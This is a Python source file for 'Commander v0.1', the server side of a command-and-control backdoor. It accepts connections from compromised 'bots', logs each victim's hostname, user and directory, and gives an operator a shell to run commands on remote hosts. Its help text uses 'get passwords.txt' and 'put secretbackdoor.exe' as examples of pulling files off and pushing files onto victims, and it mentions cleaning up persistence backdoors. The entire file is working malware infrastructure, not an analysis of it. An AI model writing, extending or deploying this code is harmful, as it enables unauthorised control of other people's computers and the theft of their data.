import socket
import os
import sys
import threading
from queue import Queue
import time
import select

# Python 3.5.4 (v3.5.4:3f56838, Aug  8 2017, 02:17:05) [MSC v.1900 64 bit (AMD64)] on win32

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
all_hostnames = []
all_is_admin = []
all_mac_addresses = []
all_os = []
all_os_num = []
all_os_ver = []
all_architecture = []
all_cpu = []
all_cwd = []
all_user = []

# Create socket
def socket_create():
    try:
        global host
        global port
        global s

        host = ''
        port = 50500
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Socket failed to create: " + str(msg))

# Bind socket to port and wait for connection
def socket_bind():
        try:
            global host
            global port
            global s
            print("Server started on port " + str(port))
            #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((host, port))
            s.listen(5)
        except socket.error as msg:
            print("Socket failed to bind: " + str(msg) + "\nRetrying...")
            time.sleep(5)
            socket_bind()

# Accept connections from multiple clients and save to list
def accept_connections():
    # Clean connections
    #for c in all_connections:
        #c.close()
    del all_connections[:]
    del all_addresses[:]
    del all_hostnames[:]
    #del all_is_admin[:]
    #del all_mac_addresses[:]
    #del all_os[:]
    #del all_os_num[:]
    #del all_os_ver[:]
    del all_architecture[:]
    del all_cwd[:]
    del all_user[:]
    #del all_cpu[:]
	
    while True:
        try:
            # Accept the connection and catch target recon data
            conn, address = s.accept()
            conn.setblocking(1)
            print("\n[+]\tNew bot added (" + address[0] + ":" + str(address[1]) + ")\n")
            all_connections.append(conn)
            all_addresses.append(address)
            client_response = str(conn.recv(1025), "utf-8")
            
            # Parse input
            architecture = client_response.split(";")[0]
            hostname = client_response.split(";")[1]
            #local_ipaddress = client_response.split(";")[2]
            cwd = client_response.split(";")[3]
            user = client_response.split(";")[4]
            #is_admin = client_response.split(",")[1]
            #mac_address = client_response.split(",")[3]
            #os = client_response.split(",")[4]
            #os_num = client_response.split(",")[5]
            #os_ver = client_response.split(",")[6]
            #cpu = client_response.split(",")[8]
            
            # Create arrays of all data
            all_architecture.append(architecture)
            all_hostnames.append(hostname)
            all_cwd.append(cwd)
            all_user.append(user)
                
            #all_is_admin.append(is_admin)
            #all_mac_addresses.append(mac_address)
            #all_os.append(os)
            #all_os_num.append(os_num)
            #all_os_ver.append(os_ver)
            #all_cpu.append(cpu)
            
            # Format output
            #data = ""
            #data += "\tHostname:\t" + hostname + "\n"
            #data += "\tAdministrator:\t" + is_admin + "\n"
            #data += "\tLocal IP:\t" + address[0] + "\n"
            #data += "\tMAC address:\t" + mac_address + "\n"
            #data += "\tOS:\t\t" + os + " " + os_num + "\n"
            #data += "\tVersion:\t" + os_ver + "\n"
            #data += "\tArchitecture:\t" + architecture + "\n"
            #data += "\tCurrent dir:\t" + cwd + "\n"
            #data += "\tUser:\t\t" + user + "\n"
            #data += "\tCPU:\t\t" + cpu + client_response.split(",")[9] + "\n"
            #data += ""
            list_connections()
            print("\ncommander > ", end="")
        except Exception as err:
            print(err)
            print("\nError accepting connections")

# Display help for server commands
def display_help():
    print("\nCommander v0.1")
    print("Server commands:\n")
    print("\tlist - List current active connections")
    print("\tselect [id] - Select session of active connections and drop into a shell")
    print("\tdelcon [id] - Delete an active session (this will not close the client on remote host)")
    print("\nRemote commands:\n")
    print("\twhoami - Get username of the remote host")
    print("\tpwd - Get current directory")
    print("\thostname - Get hostname of the remote host")
    print("\tcleanpersist - Clean up persistence backdoors")
    print("\texec [cmd command] - Execute cmd commands directly on remote host")
    print("\tbg - Background the current remote shell and return to server")
    print("\tquit - Close the current connection (Also closes process on remote host)")
    print("\n")

def display_help_remote():
    print("\nAvailable remote commands:\n")
    print("\tcd - Change current working directory")
    print("\tls/dir - List files and directories from current working directory")
    print("\twhoami - Get username of the remote host")
    print("\tpwd - Get current directory")
    print("\thostname - Get hostname of the remote host")
    print("\tcleanpersist - Clean up persistence backdoors")
    print("\texec [cmd command] - Execute cmd commands directly on remote host")
    print("\tbg - Background the current remote shell and return to server")
    print("\tquit - Close the current connection (Also closes process on remote host)")
    print("\nFile upload/download:\n")
    print("\tget - Download file from current working directory to the server")
    print("\t\tExample: get passwords.txt")
    print("\tput - Upload file from server to the current working directory @ client")
    print("\t\tExample: put secretbackdoor.exe")
    print("\n")

# Interactive prompt for sending commands remotely
def start_shell():
    print("Hello commander! Type 'help' for a list of available commands.")
    while True:
        cmd = input('commander > ')
        if cmd == 'list': # List current connections
            list_connections()
        elif 'select' in cmd: # Select a connection by id
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif 'delcon' in cmd:
            conn, target = delete_conn(cmd)
            if conn is not None:
                try:
                    del all_connections[target]
                    del all_addresses[target]
                    del all_hostnames[target]
                    del all_architecture[target]
                    del all_cwd[target]
                    del all_user[target]
                except IndexError:
                    pass
        elif cmd == 'help': # Print help
            display_help()
        elif cmd == '':
            continue
        else:
            print("The server does not recognize the command: " + str(cmd))

# Display all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            ready = select.select([conn], [], [], 1)
            if ready[0]:
                conn.recv(20480)
        except:
            try:
                del all_connections[i]
                del all_addresses[i]
                del all_hostnames[i]
                del all_architecture[i]
                del all_cwd[i]
                del all_user[i]
            except IndexError:
                pass
            #del all_is_admin[i]
            #del all_mac_addresses[i]
            #del all_os[i]
            #del all_os_num[i]
            #del all_os_ver[i]
            #del all_cpu[i]
            continue
        try:
            results += str(i) + "\t" + str(all_addresses[i][0]) + "\t" + str(all_addresses[i][1]) + '\n'
        except IndexError:
            results += str(i) + "\t" + "Disconnected" + "\t" + "Disconnected" + '\n'
            
        results += "\t-\n"
        
        try:
            results += "\tHostname:\t" + all_hostnames[i] + "\n"
        except IndexError:
            results += "\tHostname:\tDisconnected\n"
        #results += "\tAdministrator:\t" + all_is_admin[i] + "\n"
        try:
            results += "\tLocal IP:\t" + str(all_addresses[i][0]) + "\n"
        except IndexError:
            results += "\tHostname:\tDisconnected\n"
        #results += "\tMAC address:\t" + all_mac_addresses[i] + "\n"
        #results += "\tOS:\t\t" + all_os[i] + " " + all_os_num[i] + "\n"
        #results += "\tVersion:\t" + all_os_ver[i] + "\n"
        try:
            results += "\tArchitecture:\t" + all_architecture[i] + "\n"
        except IndexError:
            results += "\tHostname:\tDisconnected\n"
        try:
            results += "\tCurrent dir:\t" + all_cwd[i] + "\n"
        except IndexError:
            results += "\tHostname:\tDisconnected\n"
            
        try:
            results += "\tUser:\t\t" + all_user[i] + "\n"
        except IndexError:
            results += "\tHostname:\tDisconnected\n"
        #results += "\tCPU:\t\t" + all_cpu[i] + "\n"
        results += "\t-\n"
    
    if results != '':
        print("---- Clients ----\n")
        print("Id\tIP address\tport\n" + results)
    else:
        print("---- Clients ----\nNo clients connected")
        

def get_target(cmd):
    try:
        global target 
        target = int(cmd.replace('select ', ''))
        conn = all_connections[target]
        cwd = all_cwd[target]
        user = all_user[target].replace(' ', '')
        
        print("Connected to " + str(all_addresses[target][0]) + " on port " + str(all_addresses[target][1]))
        print("Type 'help' to check available remote commands.")
        prompt = user + "@" + cwd + "$ "
        print(prompt, end="")
        return conn
    except:
        print("Selection not valid")
        return None
        
def delete_conn(cmd):
    try:
        global target 
        target = int(cmd.replace('delcon ', ''))
        conn = all_connections[target]
        print("Session " + str(target) + " deleted")
        return conn, target
    except:
        print("Selection not valid")
        return None
        
# Connect to remote client_response
def send_target_commands(conn):
    while True:
        try:
            user = all_user[target].replace(' ', '')
            cwd = all_cwd[target]
            prompt = user + "@" + cwd + "$ "
            cmd = input()
            
            if cmd == 'bg':
                break
            if cmd == 'help':
                display_help_remote()
                print(prompt, end="")
                continue
            if cmd == '':
                print(prompt, end="")
            if 'put' in cmd:
                filename = cmd.replace("put ", "")
                conn.send(str.encode(cmd))
                
                # Send filesize to determine buffersize on client
                filesize = os.path.getsize(filename)
                conn.send(str.encode(str(filesize)))

                time.sleep(1)
                
                # Open file
                f = open(filename,'rb')
                l = f.read(filesize)
                # Send file data
                while True:
                    conn.send(l)
                    l = f.read(filesize)
                    break

                f.close()
                
                # Receive upload status
                ready = select.select([conn], [], [], 3)
                if ready[0]:
                    client_response = (conn.recv(1024)).decode('utf-8')
                print(client_response)
                print(prompt, end="")
                continue
            if 'get' in cmd:
                filename = cmd.replace("get ", "")
                conn.send(str.encode(cmd))
                
                str_filesize = (conn.recv(1024)).decode('utf-8')
                filesize = int(str_filesize.replace("\x00",""))
                
                with open(filename, 'wb') as f:
                    while True:
                        data = conn.recv(filesize)
                        f.write(data)
                        break
                f.close()
                
                # Upload status
                downloaded_filesize = os.path.getsize(filename)
                if downloaded_filesize == filesize:
                    print("Successfully downloaded " + filename)
                print(prompt, end="")
                continue
            if 'cd' in cmd:
                conn.send(str.encode(cmd))
                ready = select.select([conn], [], [], 3)
                if ready[0]:
                    cwd = (conn.recv(1024)).decode('utf-8')
                
                # Update cwd in cwd_all array
                all_cwd[target] = cwd
                prompt = user + "@" + cwd + "$ "
                print(prompt, end="")
                continue
            if len(str.encode(cmd)) > 0:
                client_response = "Command not recognized or client took too long to respond."
                conn.send(str.encode(cmd))
                ready = select.select([conn], [], [], 3)
                if ready[0]:
                    #client_response = str(conn.recv(20480), "utf-8")
                    while True:
                        client_response = (conn.recv(16384)).decode('utf-8')
                        if (client_response is not None):
                            break
                print(client_response)
                print(prompt, end="")
            if cmd == 'quit':
                break

        except Exception as err:
            print("Connection was lost")
            print(err)
            break
            
# Create threads
def create_threads():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do next job in queue (one handles connections, other sends commands)
def work():
    try:
        while True:
            x = queue.get()
            if x == 1:
                socket_create()
                socket_bind()
                accept_connections()
            if x == 2:
                time.sleep(0.1)
                start_shell()
            queue.task_done()
    except KeyboardInterrupt:
        print("Exitting.")

# Each list item is new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

def main():
    create_threads()
    create_jobs()

if __name__ == '__main__':
    main()